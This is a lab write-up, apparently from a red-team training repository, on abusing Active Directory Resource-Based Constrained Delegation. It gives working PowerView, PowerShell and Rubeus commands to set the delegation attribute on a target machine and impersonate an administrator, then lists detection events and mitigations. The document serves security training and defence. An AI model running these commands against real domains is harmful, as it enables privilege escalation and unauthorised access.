# Attack Scenario: Resource-Based Constrained Delegation (RBCD) Abuse
This scenario demonstrates abuse of Resource-Based Constrained Delegation, where an attacker controlling a machine account configures another machine to trust it for delegation. This enables impersonation of any domain user (including privileged ones) when accessing services on that resource.

MITRE ATT&CK Techniques:

T1550.002 – Pass-the-Ticket

T1134.001 – Token Impersonation/Theft

##  Lab Environment
Controlled machine account: WS01$

Target system: APP01.internal.lab

Domain Controller: dc01.internal.lab

Privileged user: admin.internal.lab

Preconditions:

- Attacker has rights to modify the msDS-AllowedToActOnBehalfOfOtherIdentity attribute on APP01

- Kerberos Constrained Delegation is configured on the domain

## Objectives
Configure RBCD to allow WS01$ to impersonate any user on APP01

Impersonate a high-privilege user (e.g., Domain Admin)

Access resources on the target machine as that user

## Execution Steps
### 1. Confirm You Control a Machine Account
Use PowerView:

```Get-DomainComputer -Identity WS01```

You should have the ability to modify other objects (GenericWrite, GenericAll, or WriteProperty).

### 2. Configure RBCD on the Target
Use Set-ADComputer (requires ActiveDirectory module or PowerView):

```
$SID = Get-DomainComputer WS01 | Select -ExpandProperty objectsid
$SD = New-Object Security.AccessControl.CommonSecurityDescriptor $false, $false, 'D:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;' + $SID.Value + ')'
Set-DomainObject -Identity APP01 -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SD.GetSddlForm('All')}
```

### 3. Trigger Delegation Using s4u2proxy
Use Rubeus (attacker-side):

```Rubeus.exe s4u /user:WS01$ /rc4:<hash> /impersonateuser:admin /msdsspn:cifs/APP01.internal.lab /ptt```
### 4. Confirm Access
Try:

```dir \\APP01\C$ or Enter-PSSession using injected ticket```

## Detection Guidance
Defender for Identity:
Unusual delegation configurations

"Suspicious Kerberos delegation usage"

Logs:
- 4742: Computer object modified (RBCD attribute)
- 4769: TGS requests for high-privileged users using delegation
- 4624: Logon events to APP01 from an unusual machine account

## Mitigations
Monitor and restrict GenericAll / WriteProperty permissions on computer objects

Alert on changes to msDS-AllowedToActOnBehalfOfOtherIdentity

Use gMSAs and tiered admin access to reduce risk

Limit account permissions with Least Privilege principles

## References
https://dirkjanm.io/abusing-active-directory-acls-weaponizing-ldap/

https://github.com/GhostPack/Rubeus

https://adsecurity.org/?p=4056

https://attack.mitre.org/techniques/T1550/002/

## Navigation
← [Back to Lab Index](../../README.md)
→ [Related: Unconstrained Delegation Abuse](./unconstraied-delegation.md)